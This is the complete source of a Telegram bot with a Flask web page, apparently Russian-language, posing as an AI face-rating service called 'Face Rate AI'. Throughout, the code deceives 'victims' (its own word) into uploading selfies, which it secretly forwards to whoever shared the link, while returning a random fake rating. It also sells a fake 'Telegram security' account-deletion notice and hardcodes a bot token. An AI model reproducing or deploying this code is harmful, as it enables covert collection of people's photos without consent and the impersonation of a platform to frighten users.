import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, LabeledPrice, WebAppInfo
from flask import Flask, request, send_file
from threading import Thread
import random
import os

# ТОКЕН БОТА (ВСТАВЬ СВОЙ)
TELEGRAM_TOKEN = "9037182564:AAF8t7WjlmrdSWmNsQV0nWxDkZM8LK-CwDc"
bot = telebot.TeleBot(TELEGRAM_TOKEN)

victims = {}
app = Flask(__name__)

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' not in request.files:
        return "Нет фото", 400
    
    photo = request.files['photo']
    user_id = int(request.form.get('user_id'))
    
    filename = f"temp_{user_id}.jpg"
    photo.save(filename)
    
    inviter_id = victims.get(user_id)
    
    if inviter_id:
        with open(filename, 'rb') as f:
            bot.send_photo(inviter_id, f, caption=f"📸 **Жертва попалась через сайт!**\nИмя: {user_id}")
    
    ratings = ["SUB 5 😭", "SUB 5 😭", "SUB 5 😭", "NPC 😐", "CHAD 🗿"]
    result = random.choice(ratings)
    
    os.remove(filename)
    return result

# --- ЛОГИКА БОТА ---
@bot.message_handler(commands=['start'])
def start_message(message):
    command_parts = message.text.split()
    
    # 1. ЖЕРТВА (перешла по ссылке на сканер)
    if len(command_parts) > 1 and command_parts[1] != "ban_prank":
        try:
            inviter_id = int(command_parts[1])
            victims[message.from_user.id] = inviter_id
            text = "🤖 **Добро пожаловать в Face Rate AI!**\n\nЯ — нейросеть, которая оценивает твое лицо по шкале от Sub 5 до Chad.\n\n📸 Нажми на кнопку ниже, чтобы открыть сканер и загрузить селфи!"
            
            # ССЫЛКА НА ТВОЙ RENDER
            web_app_url = "https://face-bot-1-p8zh.onrender.com" 
            
            markup = InlineKeyboardMarkup()
            btn = InlineKeyboardButton("🚀 Открыть сканер", web_app=WebAppInfo(url=web_app_url))
            markup.add(btn)
            
            bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
        except ValueError:
            pass
            
    # 2. ПЕРЕХОД ПО ССЫЛКЕ НА СНОС (ПЛАТНЫЙ ПРАНК)
    elif len(command_parts) > 1 and command_parts[1] == "ban_prank":
        text = (
            "⚠️ **СЛУЖБА БЕЗОПАСНОСТИ TELEGRAM** ⚠️\n\n"
            "Внимание! Ваш аккаунт уличен в подозрительной активности.\n"
            "Нарушение: Использование фото, которые не проходят по стандартам Chad.\n\n"
            "❌ **Аккаунт будет удален завтра в 12:00.**\n\n"
            "(Шутка! Это пранк от твоего друга 😂)"
        )
        bot.send_message(message.chat.id, text, parse_mode="Markdown")
    
    # 3. СОЗДАТЕЛЬ (зашел сам)
    else:
        bot_info = bot.get_me()
        invite_link = f"https://t.me/{bot_info.username}?start={message.from_user.id}"
        
        text = (
            "🤖 **Босс передаёт привет!** 👋\n\n"
            "Ты в главном штабе Face Rate AI.\n\n"
            "1️⃣ Хочешь узнать настоящую оценку лица друга? Жми **«📋 Скопировать ссылку»** и скинь ему. Как только он загрузит селфи, его фото прилетит тебе сюда! 😈\n\n"
            "2️⃣ А если хочешь устроить **тотальный пранк** — жми вторую кнопку. Бот вышлет ему фейковое уведомление, что его аккаунт заблокируют. Стоит всего 10 ⭐."
        )
        
        markup = InlineKeyboardMarkup()
        btn_copy = InlineKeyboardButton("📋 Скопировать ссылку", copy_text=telebot.types.CopyTextButton(text=invite_link))
        btn_buy = InlineKeyboardButton("💀 Снести аккаунт друга (10 ⭐)", callback_data="buy_ban")
        
        markup.add(btn_copy)
        markup.add(btn_buy)
        
        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")

# --- ОБРАБОТЧИК КНОПКИ "СНЕСТИ АККАУНТ" ---
@bot.callback_query_handler(func=lambda call: call.data == "buy_ban")
def callback_buy(call):
    bot.answer_callback_query(call.id, "Выставляю счет... 💸")
    bot.send_invoice(
        call.message.chat.id,
    title="Пранк: Снос аккаунта",
        description="Фейковое уведомление от Телеграма о скором удалении аккаунта.",
        invoice_payload="ban_prank_10",
        provider_token="", 
        currency="XTR", 
        prices=[LabeledPrice(label="Пранк-Снос", amount=10)]
    )

@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

# Выдача ссылки после оплаты
@bot.message_handler(content_types=['successful_payment'])
def got_payment(message):
    bot_info = bot.get_me()
    ban_link = f"https://t.me/{bot_info.username}?start=ban_prank"
    
    markup = InlineKeyboardMarkup()
    btn = InlineKeyboardButton("💀 Ссылка на снос", url=ban_link)
    markup.add(btn)
    
    bot.send_message(message.chat.id, f"💸 **Оплата 10 ⭐ прошла!**\n\nНажми на кнопку ниже, чтобы получить ссылку. Кидай ее другу!", reply_markup=markup, parse_mode="Markdown")

# --- ЗАПУСК ---
def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    t = Thread(target=run_flask)
    t.start()
    print("Face Rate Web App запущен!")
    bot.infinity_polling()
